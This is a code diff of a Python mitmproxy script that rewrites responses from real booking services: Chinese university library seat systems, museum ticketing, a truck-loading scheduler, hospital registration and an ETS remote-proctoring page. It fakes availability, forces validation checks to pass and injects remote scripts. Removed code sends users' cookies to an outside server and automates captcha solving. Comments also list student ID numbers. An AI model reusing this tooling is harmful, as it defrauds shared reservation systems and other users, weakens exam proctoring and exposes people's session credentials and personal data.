@@ -3,6 +3,8 @@ import re
 import http.client
 import json,os
 import datetime
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context
 
 def nextDay(num):
   temp_date = datetime.datetime.now()
@@ -22,534 +24,363 @@ def nextDaySecurity(num):
 
 hackList = [
   {
-    "url": "http.*://office.chaoxing.com/data/apps/seat/config",
-    "hack": [
-      [
-        '"reserveBeforeDay":1', 
-        '"reserveBeforeDay":3'
-      ]
-    ]
-  },
-  {
-    "url": "http.*://office.chaoxing.com/front/apps/seat/select",
-    "hack": [
-      [
-        '提交</p>', 
-        '''提交</p>
-        <p class="order_submit" style="position: fixed;bottom: 20%;width: 20vw;height: 30px;line-height: 30px;right: 2%;bottom:13%;z-index:999;" v-if="chosedSeatNum != ''"onclick="owoseet()">保存抢座</p>
-        <div id="owo3" style="display:none">{{chosedSeatNum}}</div>
-        '''
-      ],
-      [
-        'return dateArr',
-        '''
-        window.roomID = id
-        return dateArr
-        '''
-      ],
-      [
-        '</body>',
-        '''
-        <script>
-          let seatList = new Set()
-          function owoseet (e) {
-            const userCookie = document.querySelector('#resCookie').innerText
-            const roomID = window.roomID
-            seatList.add(document.querySelector('#owo3').innerText)
-            var usernameS = localStorage.getItem('username')
-            var sessionS = localStorage.getItem('session')
-            const sendData = JSON.stringify({
-              username: usernameS,
-              session: sessionS,
-              type: '学习通',
-              value: {
-                cookie: userCookie,
-                roomID: roomID,
-                seat: Array.from(seatList)
-              }
-            })
-            fetch(`//going.run/userServer?route=updata`, {
-              method: 'POST',
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: sendData
-            }).then((response) => {return response.json();}).then((res) => {
-              if (res.err === 0) {
-                var r=confirm(`您已将${Array.from(seatList).length}个座位加入后台列表，点击确认跳转后台自助抢座，取消可继续添加座位`);
-                if (r==true) {
-                  window.location.href = 'http://cunchu.site/work/debug/index.html'
-                }
-              } else {
-                alert(`保存失败: ${res.message}`)
-              }
-              outInfo()
-            })
-          }
-        </script>
-        '''
-      ],
-      [
-        "if (!_this.submitStatus) {",
-        "if (false) {"
-      ],
-    ]
-  },
-  {
-    "url": ".*/ticketapi.sxhm.com/api/ticket/calendar",
-    "hack": [
-      [
-        '"tp_last_stock_nfree":0', 
-        '''"tp_last_stock_nfree":100'''
-      ],
-      [
-        '"tp_last_stock":0', 
-        '''"tp_last_stock":100'''
-      ],
-    ]
-  },
-  {
-    "url": ".*/ticketapi.sxhm.com/api/ticket/detail",
-    "hack": [
-      [
-        '"tp_last_stock":0', 
-        '''"tp_last_stock":100'''
-      ],
-    ]
-  },
-  {
-    "url": ".*/clientweb/m/ic2/default.aspx|office.chaoxing.com/front/apps/seat/index",
+    "url": "clientweb/m/ic2/Default.aspx",
     "hack": [
       [
         '</body>', 
         '''
         <link charset="utf-8" rel="stylesheet" href="https://cunchu.site/work/login/mini.css">
-        <script src="https://cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
+        <script src="//cunchu.site/work/script/newClient.js" type="text/javascript" charset="UTF-8"></script>
+        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
         </body>
         '''
       ],
     ]
   },
   {
-    "url": ".*/clientweb/m/a/resvsub.aspx",
+    "url": "https://ibtprod-rp.ets.org/ibt2tcweb/rmproctor",
     "hack": [
       [
-        '<div class="content-block">', 
-        '''
-        <div class="" id="xinxi" style="height: 150px;">抢座信息</div>
-        <script>
-        function zidong () {
-          alert('sd')
-          // alert(app.formToJSON(fm[0]))
-        }
-        </script>
-        '''
-      ],
-    ]
-  },
-  {
-    "url": ".*/ic.ctbu.edu.cn/clientweb/m/ic2/app.js",
-    "hack": [
-      [
-        'if (fm.mustItem())', 
-        '''pro.confirm = function(text, callBack) {callBack()};
-        if (!window.cishu) window.cishu = 1
-        pro.msgBox = function(text) {document.querySelector('#xinxi').innerText = `[${window.cishu++}] ${text}`;}
-        if (true)'''
+        '</body>', 
+        '''<script src="https://cdn.bootcdn.net/ajax/libs/vConsole/3.4.0/vconsole.min.js"></script>
+ <script>
+     // init vConsole
+     var vConsole = new VConsole();
+ </script></body>'''
       ]
     ]
   },
   {
-    "url": ".*/ticket.sxhm.com/mm/ticketOrder/selectTicket",
+    "url": "https://ibtprod-rp.ets.org/ibt2tcweb/rmproctor/rmproctor.js",
     "hack": [
+      [
+        '!data.errorMsg', 
+        '''true'''
+      ],
+      [
+        'data.resp && data.resp.regResponse && data.resp.regResponse.appointmentData', 
+        '''true'''
+      ],
+      [
+        'data.resp.regResponse.appointmentData', 
+        '''{"candidateId":0,"registrationSystemId":0,"packageId":"00000000000","adminCode":0}'''
+      ],
+    ]
+  },
+  {
+    "url": "https://uwei.dataesb.com/webWechat/SeatBooking/startBookingTwo",
+    "hack": [
+      [
+        'longDay = "0"', 
+        'longDay = "1"'
+      ],
       [
         '</body>', 
         '''
-        <script src="//cunchu.site/work/script/%E9%99%95%E8%A5%BF%E5%8E%86%E5%8F%B2%E5%8D%9A%E7%89%A9%E9%A6%86.js"></script>
+        <link charset="utf-8" rel="stylesheet" href="https://cunchu.site/work/login/mini.css">
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
+        <script>window.owoType = '贵州省图书馆'</script>
+        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
         </body>
         '''
       ],
     ]
   },
   {
-    "url": ".*/wechat.laixuanzuo.com/index.php/reserve/index.html|.*/wechat.laixuanzuo.com/index.php/prereserve/index.html",
+    "url": "https://uwei.dataesb.com/webWechat/SeatBooking/startBookingThree",
     "hack": [
       [
-        '</body>', 
-        '''
-        <script src="//cunchu.site/work/script/%E6%9D%A5%E9%80%89%E5%BA%A7.js"></script>
-        </body>
-        '''
+        '', 
+        '请关闭代理!'
       ],
     ]
   },
-  {
-    "url": ".*/wechat.v2.traceint.com/index.php/reserve/index.html|.*/wechat.v2.traceint.com/index.php/prereserve/index.html",
-    "hack": [
-      [
-        '</body>', 
-        '''
-        <script src="//web-1251887489.cos.ap-shanghai.myqcloud.com/wqtsg.js"></script>
-        </body>
-        '''
-      ],
-    ]
-  },
-  # 天津大学我去图书馆
-  {
-    "url": ".*/seatw.lib.tju.edu.cn/index.php/reserve/index.html|.*/seatw.lib.tju.edu.cn/index.php/prereserve/index.html",
-    "hack": [
-      [
-        '</body>', 
-        '''
-        <script src="https://cdn.bootcdn.net/ajax/libs/vConsole/3.4.0/vconsole.min.js"></script>
-        <script>
-            // init vConsole
-            alert(VConsole)
-            var vConsole = new VConsole();
-        </script>
-        <script src="//cunchu.site/work/script/%E6%B4%A5%E5%A4%A7.js"></script>
-        </body>
-        '''
-      ],
-    ]
-  },
-  # 一考即过
   # {
-  #   "url": ".*/leosys.cn/hlju/rest/v2/room/layoutByDate",
+  #   "url": ".*/api.php/v3qrtime",
   #   "hack": [
   #     [
-  #       '"local":true', 
-  #       '"local":false'
+  #       '', 
+  #       '''{"status":1,"msg":"\\u670d\\u52a1\\u5668\\u65f6\\u95f4","data":49793547986}'''
+  #     ],
+  #   ]
+  # },
+  # {
+  #   "url": "https://ujnpl.educationgroup.cn/xsgl/stdYy/loadZw",
+  #   "hack": [
+  #     [
+  #       '"src":"1.png"', 
+  #       '"src":"0.png"'
+  #     ],
+  #     [
+  #       '"src":"2.png"', 
+  #       '"src":"0.png"'
+  #     ],
+  #   ]
+  # },
+  # {
+  #   "url": "//wxcourse.jxufe.cn/wxlib/wx/data/venueDistributionInfo",
+  #   "hack": [
+  #     [
+  #       '2022-04-09', 
+  #       '2022-04-11'
+  #     ],
+  #   ]
+  # },
+  # {
+  #   "url": "//wxcourse.jxufe.cn/wxlib/wx/data/dateSeatNumStatus",
+  #   "hack": [
+  #     [
+  #       '', 
+  #       '''{"code":1,"success":true,"message":"","result":[{"num":1,"start":"08:00","end":"12:00","allSeatNum":34,"noSeat":0},{"num":2,"start":"12:00","end":"17:00","allSeatNum":34,"noSeat":0},{"num":3,"start":"17:00","end":"23:00","allSeatNum":34,"noSeat":28}]}'''
+  #     ],
+  #   ]
+  # },
+  # 湖南农业大学
+  {
+    "url": "//libseat.hunau.edu.cn/mobile/html/seat/seatquickbook.html",
+    "hack": [
+      [
+        '</body>', 
+        '''
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
+        <script>window.owoType = '湖南农业大学';mui.alert = function () {};</script>
+        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
+        <script src="//cunchu.site/work/script/%E6%B9%96%E5%8D%97%E5%86%9C%E4%B8%9A%E5%A4%A7%E5%AD%A6.js"></script>
+        </body>'''
+      ],
+    ]
+  },
+  # 厦门大学
+  {
+    "url": "https://lib.xmu.edu.cn/seatwx/",
+    "hack": [
+      [
+        '</body>', 
+        '''
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
+        
+        <script src="https://cunchu.site/work/assist/logPanel.js"></script>
+        <script src="//cunchu.site/work/assist/%E5%8E%A6%E9%97%A8%E5%A4%A7%E5%AD%A6/index.js"></script>
+        <script>window.owoType = '厦门大学';</script>
+        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
+        </body>'''
+      ],
+    ]
+  },
+  # 北京理工大学
+  {
+    "url": "//seat.lib.bit.edu.cn/h5/",
+    "hack": [
+      [
+        '</body>', 
+        '''
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
+        <script>window.owoType = '北京理工大学';mui.alert = function () {};</script>
+        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
+        </body>'''
+      ],
+    ]
+  },
+  {
+    "url": "//gym.dazuiwl.cn/h5/",
+    "hack": [
+      [
+        '</body>', 
+        '''
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
+        <script>window.owoType = '北京理工大学场馆';mui.alert = function () {};</script>
+        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
+        </body>'''
+      ],
+    ]
+  },
+  {
+    "url": "//seat.lib.bit.edu.cn/api/Seat/date",
+    "calculate": 0
+  },
+  {
+    "url": "//seat.lib.bit.edu.cn/api/Seat/seat",
+    "hack": [
+      [
+        '"status":"2"', 
+        '"status":"1"'
+      ],
+    ]
+  },
+  {
+    "url": "//gym.dazuiwl.cn/api/sport_events/open_times/id",
+    "calculate": 1
+  },
+  # 湖南大学
+  {
+    "url": "//yrkj.hnu.edu.cn/mobile/html/seat/seatquickbook.html",
+    "hack": [
+      [
+        '</body>', 
+        '''
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
+        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
+        <script>window.owoType = '湖南大学';mui.alert = function () {};</script>
+        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
+        <script src="//cunchu.site/work/script/%E6%B9%96%E5%8D%97%E5%86%9C%E4%B8%9A%E5%A4%A7%E5%AD%A6.js"></script>
+        </body>'''
+      ],
+    ]
+  },
+  {
+    "url": "https://chaxin.hnu.edu.cn/mobile/html/seat/book_nav.html",
+    "hack": [
+      [
+        '</body>', 
+        '<link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css"><link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css"><script>window.owoType = "湖南工商大学";alert("现在可以关闭代理了,否则影响速度!");</script><script src="https://cunchu.site/work/assist/logPanel.js"></script><script src="//cunchu.site/work/debug/js/%E6%B9%96%E5%8D%97%E5%B7%A5%E5%95%86.js"></script></body>'
+      ],
+    ]
+  },
+  {
+    "url": "http://chaxin.hnu.edu.cn/mobile/html/seat/book_nav.html",
+    "hack": [
+      [
+        '</body>', 
+        '<link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css"><link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css"><script>window.owoType = "湖南工商大学";alert("现在可以关闭代理了,否则影响速度!");</script><script src="https://cunchu.site/work/assist/logPanel.js"></script><script src="//cunchu.site/work/debug/js/%E6%B9%96%E5%8D%97%E5%B7%A5%E5%95%86.js"></script></body>'
+      ],
+    ]
+  },
+  # 湖南工商大学
+  {
+    "url": "//libseat.hutb.edu.cn/mobile/html/seat/seatbook.html",
+    "hack": [
+      [
+        '</body>', 
+        '<link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css"><link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css"><script>window.owoType = "湖南工商大学";alert("现在可以关闭代理了,否则影响速度!");</script><script src="https://cunchu.site/work/assist/logPanel.js"></script><script src="//cunchu.site/work/debug/js/%E6%B9%96%E5%8D%97%E5%B7%A5%E5%95%86.js"></script></body>'
+      ],
+    ]
+  },
+  {
+    "url": "https://libseat.hutb.edu.cn/mobile/html/seat/seatquickbook.html",
+    "hack": [
+      [
+        '</body>', 
+        '</body><script>window.alert=function () {}</script>'
+      ],
+    ]
+  },
+  # {
+  #   "url": "https://dappweb-api.huolala.cn/index.php",
+  #   "hack": [
+  #     [
+  #       '"disable":1', 
+  #       '"disable":0'
   #     ],
   #   ]
   # },
   {
-    "url": ".*/web.traceint.com/web/index.html",
+    "url": "https://libapp.heuet.edu.cn:82/Seat/BespeakSeat/BespeakChoice.aspx",
     "hack": [
       [
-        '</body>', 
-        '''
-        <script src="//cunchu.site/work/script/wqtsg.js"></script>
-        </body>
-        '''
+        'window.location.href = "../Menu.aspx";', 
+        ''
+      ],
+    ]
+  },
+  # 2023-10-21
+  {
+    "url": "https://assist.yqgx123.com/api/getBookingTimes",
+    "hack": [
+      [
+        '2023-04-22', 
+        '2023-04-23'
+      ],
+      [
+        '"bookingStatus":3', 
+        '"bookingStatus":null'
+      ],
+      [
+        '"该时间段尚未开放预约"', 
+        'null'
+      ],
+      [
+        '"isChecked":false', 
+        '"isChecked":true'
       ],
     ]
   },
   {
-    "url": ".*/app.papa.com.cn/js/chunk-",
+    "url": "/js/0.25bd6725cdaf9eadf670.js",
     "hack": [
       [
-        't.next=12;', 
-        '''t.next=8;'''
+        'Global.NUMCODE);',
+        'Global.NUMCODE);alert(o);'
       ],
     ]
   },
   {
-    "url": ".*/api.wesais.com/field/wxFieldBuyPlan/getList",
+    "url": "http://libreserve.nuist.edu.cn/seat/rest/RoomArea/r/roomInfo",
     "hack": [
       [
-        '"is_lock":true', 
-        '''"is_lock":false'''
-      ],
-      [
-        '"is_overdue":true', 
-        '''"is_overdue":false'''
-      ],
-      [
-        '"lock_status":0', 
-        '''"lock_status":204'''
-      ],
-      [
-        '"price":0', 
-        '''"price":"55.00"'''
+        '"ISFULL":"1"',
+        '"ISFULL":"0"'
       ],
     ]
   },
   {
-    "url": ".*/app.papa.com.cn/js/chunk-",
+    "url": "http://libreserve.nuist.edu.cn/seat/rest/RoomArea/r/yyList",
     "hack": [
       [
-        'disabled:!!t.controlTime', 
-        'disabled:!!false'
-      ],
-      [
-        'if(!this.controlTime)', 
-        'if(true)'
-      ]
-    ]
-  },
-  {
-    "url": ".*/ClientWeb/pro/ajax/device.aspx",
-    "hack": [
-      [
-        '"state":"undo"', 
-        '"state":"open"'
-      ],
-      [
-        '"state":null', 
-        '"state":"open"'
-      ],
-      [
-        '"freeSta":-3',
-        '"freeSta":0',
-      ],
-      [
-        '"freeSta":-2',
-        '"freeSta":0',
-      ],
-      [
-        '"freeSta":-1',
-        '"freeSta":0',
-      ],
-      [
-        '"state":"close"', 
-        '"state":"open"'
-      ],
-      [
-        '"runsta":6', 
-        '"runsta":0'
-      ],
-      [
-        '}]}],',
-        '}],"ts":[]}],'
-      ]
-    ]
-  },
-  # 盐湖图书馆
-  {
-    "url": "//yclib.reserve.alb.letoochina.cn/Reserve/getReservationTime",
-    "hack": [
-      [
-        '"available":0', 
-        '"available":9'
+        '"COUNT":0',
+        '"COUNT":10'
       ],
     ]
   },
   {
-    "url": "//yclib.reserve.alb.letoochina.cn/Reserve/getDesks",
+    "url": "/rest/RoomArea/r/seatDetail",
     "hack": [
       [
-        '"reservable":false', 
-        '"reservable":true'
+        '"STATE":"2"',
+        '"STATE":"0"'
       ],
     ]
   },
-  # 车辆预约
   {
-    "url": ".*//mmyx.mmsh.sinopec.com/Booking/GetBookingPlanList",
+    "url": "xcx.yqgz.beijing.gov.cn",
     "hack": [
       [
-        '"BookedNum":10', 
-        '"BookedNum":0'
+        '"code":"3"', 
+        '"code":"0"'
       ],
       [
-        '"BookedNum":11', 
-        '"BookedNum":0'
+        'puCOrpWfPa6hiRTBDD60MQ==', 
+        'Ivl7cBko+tfg2m7bk2C7Ww=='
       ],
-      [
-        '"BookedNum":12', 
-        '"BookedNum":0'
-      ],
-    ],
-  },
-  # 医院预约
-  {
-    "url": ".*//wx.whyyy.com/MicroSY/reservegh",
-    "hack": [
-      [
-        '"status":"2"', 
-        '"status":"7"'
-      ],
-      [
-        '"status":"6"', 
-        '"status":"7"'
-      ],
-      [
-        '"regFlag":-1', 
-        '"regFlag":1'
-      ]
-    ],
-  },
-  {
-    "url": "http://mmyx.mmsh.sinopec.com/Booking/BookingPlanM",
-    "hack": [
-      [
-        '<script src="../../Scripts/ControlScripts/loading.js"></script>', 
-        '''
-<script src="../../Scripts/ControlScripts/loading.js"></script>
-<script>
-setTimeout(() => {
-    $("#AfterBnt").css("background-color", "#ff4a1f");
-    ISAFTERORDER = true;
-    $("#PerBnt").css("background-color", "#ff4a1f");
-    ISBEFORORDER = true;
-}, 500);
-</script>
-        '''
-      ]
-    ],
-  },
-  {
-    "url": "http://mmyx.mmsh.sinopec.com/Booking/BookingSubmitM",
-    "hack": [
-      [
-        '<button class="bnt" style="height: 1.3rem;" id="ConfirmBnt" onclick="SubmitOrder()">', 
-        '''
-<input type="datetime-local" id="clock" />
-<h3>延迟提交参数(单位秒)</h3>
-<input type="number" id="yanchi" value="0">
-<button class="bnt" style="height: 1.3rem;" id="zhengdian" onclick="tanchu()">
-  整点提交
-</button>
-<button class="bnt" style="height: 1.3rem;" id="jiankong" onclick="jiankong()">
-  监控提交
-</button>
-
-<script>
-function getYZM (imgEl, callBack) {
-    imgEl.crossOrigin = "anonymous";
-    var canvas = document.createElement("canvas");
-    var ctx = canvas.getContext("2d");  
-    ctx.drawImage(imgEl, 0, 0);
-    var dataURL = canvas.toDataURL('image/png');
-    var base64Data = dataURL.split(',')[1]
-    
-
-    fetch("http://hanshu.run/yzmb", {
-    method: 'POST',
-    body: base64Data
-    }).then(response => response.json())
-    .then(result => {
-      if (callBack) callBack(result.data.result)
-    })
-    .catch(error => console.log('error', error));
-}
-
-function getQueryVariable(variable, url) {
-  var query = window.location.search.substring(1);
-  if (url) {
-    query = url.split('?')[1]
-  }
-  var vars = query.split("&");
-  for (var i=0;i<vars.length;i++) {
-          var pair = vars[i].split("=");
-          if(pair[0] == variable){return pair[1];}
-  }
-  return(false);
-}
-
-let checkIndex = 0
-function jiankong () {
-  // getQueryVariable(, resReferer)
-  var requestOptions = {
-    method: 'GET',
-    redirect: 'follow'
-  };
-
-  fetch(`http://mmyx.mmsh.sinopec.com/Booking/GetBookingPlanList?ProductID=${getQueryVariable('productID', resReferer)}&ShipPlaceID=${getQueryVariable('qYShipPlaceID', resReferer)}&BookingDate=${getQueryVariable('date')}&PreTruckNo=%E7%B2%A4K53676&LadingBillID=${getQueryVariable('Id', resReferer)}`, requestOptions)
-    .then(response => response.json())
-    .then(result => {
-      let next = true
-      result.forEach(element => {
-        if (element.ID == getQueryVariable('PlanID')) {
-          if (element.BookedNum >0) {
-            next = false
-            refreshCode()
-            setTimeout(() => {
-              getYZM(document.querySelector('#ImageCheck'), (yzm) => {
-                document.querySelector('#InpCode').value = yzm
-                AddBooking()
-              })
-              window.newAlert = function (text, type, callback) {
-                if (text.includes('确认') && callback) {
-                  callback()
-                } else {
-                  alert(text)
-                }
-              }
-            }, 2000);
-          }
-        }
-      });
-      if (next) {
-        checkIndex++
-        document.querySelector('#jiankong').innerText = `检查次数:${checkIndex}`
-        setTimeout(() => {
-          jiankong()
-        }, 5000);
-      }
-    })
-    .catch(error => console.log('error', error));
-}
-
-function tanchu() {
-  function getLocalTime(nS) {  
-    return new Date(parseInt(nS)).toLocaleString().replace(/:\d{1,2}$/,' ');  
-  }
-  var yzmCh = false
-  var data = new Date(document.querySelector('#clock').value.replace(/-/g,'/').replace('T',' ')).valueOf()
-  var zhengdian = document.querySelector('#zhengdian')
-  // alert(getLocalTime(data))
-  function tempClock () {
-    var cha = data - Date.now() - parseInt(document.querySelector('#yanchi').value * 1000)
-    if (cha < 15000 && !yzmCh) {
-      yzmCh = true
-      refreshCode()
-      setTimeout(() => {
-        getYZM(document.querySelector('#ImageCheck'), (yzm) => {
-          document.querySelector('#InpCode').value = yzm
-        })
-        window.newAlert = function (text, type, callback) {
-          if (text.includes('确认')) {
-            if(callback) callback()
-            return
-          }
-          alert(text)
-          if (callback) callback()
-        }
-      }, 2000);
-    }
-    if (cha > 200) {
-      zhengdian.innerText = cha
-      setTimeout(() => {
-        tempClock()
-      }, 100);
-    } else {
-      AddBooking()
-    }
-  }
-  tempClock()
-}
-</script>
-<button class="bnt" style="height: 1.3rem;" id="ConfirmBnt" onclick="SubmitOrder()">
-        '''
-      ]
-    ],
-  },
-  # iobx
-  {
-    "url": ".*//www.ibox.art/zh-cn/item",
-    "hack": [
-      [
-        '''</body>''',
-        '''
-        <script src="//cunchu.site/work/script/ibox.js" defer></script>
-        </body>
-        '''
-      ]
     ]
   },
   {
-    "url": "get_my_servertime",
-    "hack": [
-      [
-        '''''',
-        '''{"ret":1,"act":"get_my_servertime","msg":"ok","data":["2021-10-29","12:11"],"ext":null}'''
-      ]
-    ]
+    "url": "https://mob.my.jj.cn/api_ci/bill/mey",
+    "redirect": "taobao/谭亚军920718.json"
   },
   # 座位预约App
+  # 2019211083 2019213830 2019214036 9月末
+  # 2019213184 10月8号
+  # 2019214001 10月14
+  # 2019212413 10月21
+  # 2017211670 2019211084 2019210674 2019212193 10月19
+  # 2019211259 10月23
+  # 2019211065  10月初
+  # 2019210762 2020210604 2019211060 2019211375 11月12
+  # 2019211028 11月14日
+  # 2019211012 11月18日
+  # 2019211049 11月19日
+  # 2019211059 11月23
+  # 2019214066 11月24
+  # 2019211395 11月25
+  # 2019211121 11月27
+  # 2019211144 12月3
+  # 2019211791 （2019211306 2020211277）年底
+  # 2019211120 2019212381 2019214204 2019210987 2019211324 2019211115 2月初
   {
     "url": ".*//zwyy-lib.chzu.edu.cn:9091/tsgintf/main/service|.*//220.180.184.9:9091/tsgintf/main/service",
     "hack": [
@@ -558,9 +389,10 @@ function tanchu() {
         '''<script type="text/javascript">
         
         api.showProgress = function (e) {console.log(e);checkSubmitFlg = false;}
-        let allowList = ["2018213345", "2018212065", "2018210406", "2016214105", "2018211147", "2018211026", "2019214347", "2018214474", "2018210624", "2018210215", "2018212107", "2018211452", "2018211793", "2019214146", "2020220440", "2018210861", "2018210344", "2019211932", "2018210332", "2018210360", "2019211984", "2018211008", "2018210087"]
+        let allowList = []
         if (allowList.includes(_key)) {
           alert('载入成功，现在关闭代理功能也可以使用功能，并获得更快速度。点击座位即可完成原来长按确认的操作，开抢前几秒一直点击基本可以预约到座位。')
+          document.querySelector('#randomBtn').outerHTML = `<div class="aui-btn aui-btn-info aui-margin-t-10" onclick="suiji()">随机分配</div>`
           setTimeout(() => {
               document.querySelectorAll('.seatFont').forEach(element => {
                 
@@ -573,6 +405,26 @@ function tanchu() {
           }, 100);
         } else {
           alert('未授权用户: ' + _key)
+        }
+        function randomNum(minNum,maxNum){ 
+          switch(arguments.length){ 
+            case 1: 
+              return parseInt(Math.random()*minNum+1,10); 
+              break; 
+            case 2: 
+              return parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
+              break; 
+            default: 
+              return 0; 
+              break; 
+          } 
+        } 
+        function suiji () {
+          var list = document.querySelectorAll('.seatFont')
+          ele = list[randomNum(0, list.length - 1)]
+          var sate = ele.getAttribute("hid")
+          // alert(sate)
+          doPreSeat(sate, roomId,GetDateStr(0), _key, startHour,endHour,'0')
         }
 function GetDateStr(AddDayCount) {
     var dd = new Date();
@@ -587,33 +439,56 @@ function GetDateStr(AddDayCount) {
       ],
     ]
   },
-  {
-    "url": ".*//wmatch-api-1210.wangqiuban.cn/weather!getDateWeatherBySku",
-    "hack": [
-      [
-        ''']}''',
-        ''',{"week":"\xe6\x98\x9f\xe6\x9c\x9f\xe5\x9b\x9b","date":"''' + nextDaySecurity(8) + '''","weather":"\xe5\xa4\x9a\xe4\xba\x91","type":"PARTLY_CLOUDY_DAY"}]}''',
-      ]
-    ]
-  },
-  {
-    "url": ".*//leosys.cn/hlju/rest/v2/free/filters",
-    "hack": [
-      [
-        '"]},',
-        '","' + nextDay(1) + '"]},',
-      ]
-    ]
-  },
-  {
-    "url": ".*//www.360banke.com/xiaotu/Seatresv/GetResvInfo.asp",
-    "hack": [
-      [
-        ']}]}',
-        ']},{"date": "' + nextDay(1) + '","weekday": "\xd0\xc7\xc6\xda\xc8\xfd","start": "07:00","end": "22:30","timeslot": ["07:00","22:30"]}]}',
-      ]
-    ]
-  }
+  # 医院预约
+  # {
+  #   "url": ".*//wx.whyyy.com/MicroSY/reservegh",
+  #   "hack": [
+  #     [
+  #       '"status":"2"', 
+  #       '"status":"7"'
+  #     ],
+  #     [
+  #       '"status":"6"', 
+  #       '"status":"7"'
+  #     ],
+  #     [
+  #       '"regFlag":-1', 
+  #       '"regFlag":1'
+  #     ]
+  #   ],
+  # },
+
+
+  # 山东财经
+  # {
+  #   "url": ".*//libst.sdufe.edu.cn/|.*//lxl.sdyu.edu.cn/|.*//www.skalibrary.net|.*/seat.lib.sdu.edu.cn",
+  #   "hack": [
+  #     [
+  #       '</body>', 
+  #       '''
+  #       <script src="http://cunchu.site/work/assist/owoHackUrl.js"></script>
+  #       <link charset="utf-8" rel="stylesheet" href="https://cunchu.site/work/login/mini.css">
+  #       <script src="https://cunchu.site/work/assist/logPanel.js"></script>
+  #       <script src="https://cunchu.site/work/debug/js/sdcj.js"></script>
+        
+  #       <script src="https://cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
+  #       <script>
+  #           window.owoHackUrlSend = {
+  #             "api.php/spaces": function (e, myUrl) {
+  #                 console.log(e, myUrl)
+  #                 if (e.indexOf('access_token') >= 0 && document.querySelector('.owo textarea')) {
+  #                   document.querySelector('.owo .send-url').value += myUrl + '@'
+  #                   document.querySelector('.owo textarea').value += e + '@'
+  #                 }
+  #             }
+  #           }
+  #       </script>
+  #       </body>
+  #       '''
+  #     ]
+  #   ],
+  # },
+
 ]
 
 reqHackList = [
@@ -621,7 +496,17 @@ reqHackList = [
   # ".*//211.70.171.14:9999/tsgintf/main/service",
   # ".*//zwyy-lib.chzu.edu.cn:9091/tsgintf/main/service"
   "http://sw.xianmaigu.com/api/YySeatAppointment/addes.html",
-  "https://prod.zixishi.tech/srapi/app/member/supplier-or-merchant-info/v1/2/211"
+  "https://tsg77.sdust.edu.cn/Base/QueryNotice",
+  "https://wx.xianmaigu.com/scwgy_seat/api/seatAppointment/seaAappointment.html",
+  "https://slg.xianmaigu.com/api/seatAppointment/seaAappointment.html",
+  "https://prod.zixishi.tech/srapi/app/member/supplier-or-merchant-info/v1/2/211",
+  "https://uwei.dataesb.com/webWechat/SeatBooking/submitBooking",
+  "https://uwei.dataesb.com/webWechat/SeatBooking/initSeat",
+  # "dappweb-api.huolala.cn/index.php"
+]
+
+repHackList = [
+  'https://mobiles.zhicall.cn/mobile-web/mobile/patient/get/familyMembers/'
 ]
 
 
@@ -632,7 +517,7 @@ class ModifyResponse:
       if ('url' in item and flow.request.url):
         findList = pattern = re.compile(item['url']).findall(flow.request.url)
         if (len(findList) > 0):
-          ctx.log.info('请求被重写:' + flow.request.url)
+          # ctx.log.info('请求被重写:' + flow.request.url)
           # flow.response.headers['Expires'] = 0
           flow.response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
           flow.response.headers['Pragma'] = 'no-cache'
@@ -640,19 +525,59 @@ class ModifyResponse:
           # print(returnText)
           if ('</body>' in returnText):
             returnText = returnText.replace('</body>', '''<div id="resCookie" style="display: none;">%s</div>\r\n<script>var resCookie = '%s';var resReferer = '%s'</script>\r\n</body>''' % (flow.request.headers.get('cookie'), flow.request.headers.get('cookie'), flow.request.headers.get('referer')))
-          for value in item['hack']:
-            if (value[0] != ""):
-              returnText = returnText.replace(value[0], value[1])
-            else:
-              returnText = value[1]
+          if ('hack' in item):
+            for value in item['hack']:
+              if (value[0] != ""):
+                returnText = returnText.replace(value[0], value[1])
+              else:
+                returnText = value[1]
+          if ('calculate' in item):
+            if (item['calculate'] == 0):
+              temp = json.loads(returnText)
+              temp['data'][1]["times"][0]["id"] = int(temp['data'][1]["times"][0]["id"]) + 1
+              returnText = json.dumps(temp)
+            if (item['calculate'] == 1):
+              temp = json.loads(returnText)
+              temp['data'] = temp['data'] + 1
+              returnText = json.dumps(temp)
+          if ("redirect" in item):
+            if (item["redirect"] != ''):
+              conn = http.client.HTTPSConnection("cos.cunchu.site")
+              payload = json.dumps({
+                "path": item["redirect"]
+              })
+              headers = {
+                'Content-Type': 'application/json'
+              }
+              conn.request("POST", "/read", payload, headers)
